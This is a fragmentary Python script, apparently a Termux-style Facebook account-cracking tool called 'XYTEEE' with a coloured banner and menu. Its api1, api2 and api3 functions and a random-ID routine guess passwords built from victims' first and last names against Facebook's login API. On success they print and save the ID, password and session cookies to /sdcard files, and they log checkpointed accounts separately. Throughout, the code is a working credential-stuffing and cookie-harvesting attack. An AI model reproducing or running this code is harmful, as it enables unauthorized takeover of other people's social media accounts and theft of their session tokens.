...
print('[✓] \033[1;97mChecking For Update. . . .')
...
if bit == '64bit':
 print('[✓] \033[1;97mYOU ARE 64BIT USER')
elif bit == '32bit':
 print('[✓] \033[1;97mYOU ARE 32BIT USER')
...
A = '\x1b[1;91m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[1;97m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
...
logo=(f"""\x1b[1;97m
 ...
 ▐▄\x1b[1;91m•\x1b[0;97m ▄  ▄\x1b[1;91m·\x1b[1;97m ▄▌▄▄▄▄▄▄▄▄ \x1b[1;91m.\x1b[1;97m▄▄▄ \x1b[1;91m.\x1b[0;97m▄▄▄ \x1b[1;91m.\x1b[1;97m
  █▌█▌\x1b[1;92m▪\x1b[1;92m▐█\x1b[1;92m▪\x1b[1;92m██▌\x1b[0;91m•\x1b[1;97m██  ▀▄\x1b[1;91m.\x1b[1;97m▀\x1b[0;91m·\x1b[0;97m▀▄\x1b[0;91m.\x1b[0;97m▀\x1b[0;91m·\x1b[1;92m▀▄\x1b[0;91m.\x1b[1;92m▀\x1b[0;91m·\x1b[0;97m
  \x1b[0;92m·\x1b[0;97m██\x1b[1;91m·\x1b[1;91m ▐█▌▐█\x1b[0;91m▪\x1b[1;97m ▐█\x1b[0;91m.▪\x1b[1;97m▐▀▀\x1b[0;91m▪\x1b[0;97m▄▐▀▀\x1b[1;91m▪\x1b[0;97m▄▐▀▀\x1b[0;91m▪\x1b[0;97m▄
...
def menu():
        try:
              #  approval()
                        ...
                        if xd in ['1','01']:
                                clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : /sdcard/xyteee.txt ');linex()
                                ...
                                os.system('xdg-open https://wa.me/+8801926890544');menu()
                        elif xd in ['0','05']:
...
def api1(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r{G}[{R}XYTEEE-M1{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
'Connection': 'Keep-Alive',}
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r{G}[{G}XYTEEE-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
                                        open('/sdcard/XYTEEE-FILE-M1-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{G}[{Y}XYTEEE-CP{G}]{Y} '+ids+' | '+pas+'\033[1;97m')
...
def api2(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r{G}[{R}XYTEEE-M2{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
"x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
                        ...
                        if 'session_key' in po:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
                                        open('/sdcard/XYTEEE-FILE-M2-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
...
def api3(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r\r{G}[{R}XYTEEE-M3{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        ...
                        if 'session_key' in po:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
                                        open('/sdcard/XYTEEE-FILE-M3-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
...
"Content-Length": str(len(content_lenght))}
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G}[{G}XYTEEE-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
                                        open('/sdcard/XYTEEE-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{G}[{Y}XYTEEE-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/XYTEEE-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                        else:
                                                break
